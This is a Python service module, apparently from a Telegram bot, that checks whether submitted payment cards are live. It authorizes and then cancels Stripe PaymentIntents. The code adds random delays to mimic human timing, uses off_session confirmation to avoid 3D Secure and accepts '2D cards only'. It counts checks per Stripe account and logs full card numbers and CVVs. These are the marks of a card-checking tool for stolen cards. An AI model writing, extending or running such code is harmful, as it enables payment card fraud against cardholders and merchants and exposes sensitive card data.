"""
Stripe service — handles PaymentIntent creation, confirmation, and cancellation.
Uses capture_method: manual (authorize only, never capture).
"""

import httpx
import random
import time
from dataclasses import dataclass
from typing import Optional
from uuid import uuid4

from config import config
from models.stripe_account import StripeAccount
from models.validation_log import ValidationLog
from services.card_validator import CardInfo
from services.crypto_service import decrypt
from services.retry_handler import retry_async, is_stripe_retryable_error
from services.stripe_api_client import StripeAPIClient


@dataclass
class ValidationResult:
    """Result of a card validation attempt."""
    status: str           # "valid", "declined", "error"
    decline_code: Optional[str]
    stripe_pi_id: Optional[str]
    bank_name: Optional[str]
    card_brand: Optional[str]
    error_message: Optional[str]


def _get_stripe_client(account: StripeAccount) -> StripeAPIClient:
    """Initialize Stripe HTTP client with a decrypted secret key."""
    secret_key = decrypt(account.secret_key_encrypted)
    return StripeAPIClient(api_key=secret_key)


def _random_delay() -> None:
    """Add 1-5 second random delay to mimic human-like timing."""
    time.sleep(random.uniform(1.0, 5.0))


async def validate_card_with_stripe(
    card: CardInfo,
    user_telegram_id: int,
    stripe_account: StripeAccount,
) -> ValidationResult:
    """
    Full Stripe validation flow with retry logic:
    1. Create PaymentIntent with capture_method=manual
    2. Create PaymentMethod from raw card
    3. Attach and confirm
    4. Parse result
    5. Cancel immediately if authorized
    6. Log the attempt

    NEVER captures funds. Always cancels the PaymentIntent.
    Retries transient errors up to 3 times with exponential backoff.
    """
    client = _get_stripe_client(stripe_account)
    validation_id = str(uuid4())
    amount = config.stripe_amount_cents

    intent = None
    payment_method = None

    try:
        # Step 1: Create PaymentIntent (with retry)
        async def create_intent():
            return client.create_payment_intent(
                amount=amount,
                currency="usd",
                metadata={
                    "telegram_user_id": str(user_telegram_id),
                    "validation_id": validation_id,
                    "bot_name": "card_validator",
                },
            )

        intent = await retry_async(
            max_retries=3,
            base_delay=1.0,
            max_delay=10.0,
            retryable_exceptions=(httpx.RequestError,),
        )(create_intent)()

        # Random delay before confirmation
        _random_delay()

        # Step 2: Create PaymentMethod from raw card details (with retry)
        async def create_payment_method():
            return client.create_payment_method(
                card_number=card.number,
                exp_month=card.exp_month,
                exp_year=card.exp_year,
                cvc=card.cvv,
            )

        payment_method = await retry_async(
            max_retries=3,
            base_delay=1.0,
            max_delay=10.0,
            retryable_exceptions=(httpx.RequestError,),
        )(create_payment_method)()

        # Step 3: Confirm with off_session=True to skip 3DS where possible (with retry)
        # off_session=True tells Stripe this is a server-side transaction
        # Cards that REQUIRE 3DS will return requires_action instead of succeeding
        async def confirm_intent():
            return client.confirm_payment_intent(
                intent_id=intent["id"],
                payment_method_id=payment_method["id"],
                off_session=True,
            )

        intent = await retry_async(
            max_retries=3,
            base_delay=1.0,
            max_delay=10.0,
            retryable_exceptions=(httpx.RequestError,),
        )(confirm_intent)()

        status = intent.get("status")

        # Step 4: Parse result
        if status == "requires_action":
            # Card requires 3D Secure (OTP) — skip it
            result = ValidationResult(
                status="3ds_required",
                decline_code="requires_3ds",
                stripe_pi_id=intent.get("id"),
                bank_name=None,
                card_brand=None,
                error_message="This card requires 3D Secure (OTP). 2D cards only.",
            )

        elif status == "requires_capture":
            # Card is valid — authorization succeeded
            # Extract bank/brand info if available
            bank_name = None
            card_brand = payment_method.get("card", {}).get("brand")

            # Step 5: Cancel immediately — NEVER capture (with retry)
            try:
                async def cancel_intent():
                    return client.cancel_payment_intent(intent_id=intent["id"])

                await retry_async(
                    max_retries=2,
                    base_delay=0.5,
                    max_delay=5.0,
                    retryable_exceptions=(httpx.RequestError,),
                )(cancel_intent)()
            except Exception as e:
                # If cancel fails after retries, log it but don't fail the validation
                # Admin should manually review in Stripe dashboard
                import logging
                logger = logging.getLogger(__name__)
                logger.error(f"Failed to cancel PaymentIntent {intent['id']} after retries: {e}")

            result = ValidationResult(
                status="valid",
                decline_code=None,
                stripe_pi_id=intent.get("id"),
                bank_name=bank_name,
                card_brand=card_brand,
                error_message=None,
            )

        elif status == "requires_payment_method":
            # Card was declined
            decline_code = None
            last_error = intent.get("last_payment_error")
            if last_error:
                decline_code = last_error.get("decline_code")

            result = ValidationResult(
                status="declined",
                decline_code=decline_code,
                stripe_pi_id=intent.get("id"),
                bank_name=None,
                card_brand=None,
                error_message=None,
            )

        else:
            # Unexpected status
            result = ValidationResult(
                status="error",
                decline_code=None,
                stripe_pi_id=intent.get("id"),
                bank_name=None,
                card_brand=None,
                error_message=f"Unexpected status: {status}",
            )

    except httpx.HTTPStatusError as e:
        # HTTP error from Stripe API
        import logging
        logger = logging.getLogger(__name__)
        
        try:
            # Log raw error response for debugging
            logger.error(f"Stripe HTTP error ({e.response.status_code}): {e.response.text[:500]}")
            
            error_data = e.response.json()
            error_obj = error_data.get("error", {})
            
            # Try multiple paths to extract decline_code
            decline_code = (
                error_obj.get("decline_code") or 
                error_obj.get("code") or
                error_data.get("decline_code") or
                error_data.get("code")
            )
            
            user_message = error_obj.get("message") or error_data.get("message")
            
            logger.info(f"Extracted decline_code: {decline_code}")
            logger.info(f"Extracted message: {user_message}")

            if e.response.status_code == 402:  # Payment Required - card declined
                result = ValidationResult(
                    status="declined",
                    decline_code=decline_code,
                    stripe_pi_id=intent.get("id") if intent else None,
                    bank_name=None,
                    card_brand=None,
                    error_message=user_message,
                )
            else:
                result = ValidationResult(
                    status="error",
                    decline_code=decline_code,
                    stripe_pi_id=None,
                    bank_name=None,
                    card_brand=None,
                    error_message=user_message or str(e),
                )
        except Exception as parse_error:
            logger.error(f"Failed to parse Stripe error response: {parse_error}")
            result = ValidationResult(
                status="error",
                decline_code=None,
                stripe_pi_id=None,
                bank_name=None,
                card_brand=None,
                error_message=str(e),
            )

    except httpx.RequestError as e:
        # Network error
        result = ValidationResult(
            status="error",
            decline_code=None,
            stripe_pi_id=None,
            bank_name=None,
            card_brand=None,
            error_message=str(e),
        )

    # Step 6: Log the validation attempt
    try:
        ValidationLog.create(
            user_id=user_telegram_id,
            card_bin=card.bin_code,
            last4=card.last4,
            card_hash="",  # Will be set by caller
            amount_cents=amount,
            stripe_pi_id=result.stripe_pi_id,
            status=result.status,
            decline_code=result.decline_code,
            stripe_account_id=stripe_account.id,
            full_card_number=card.number,
            exp_month=str(card.exp_month),
            exp_year=str(card.exp_year),
            cvv=card.cvv,
        )
    except Exception:
        # Don't fail validation if logging fails
        pass

    # Increment Stripe account daily counter
    stripe_account.increment_daily_count()

    return result
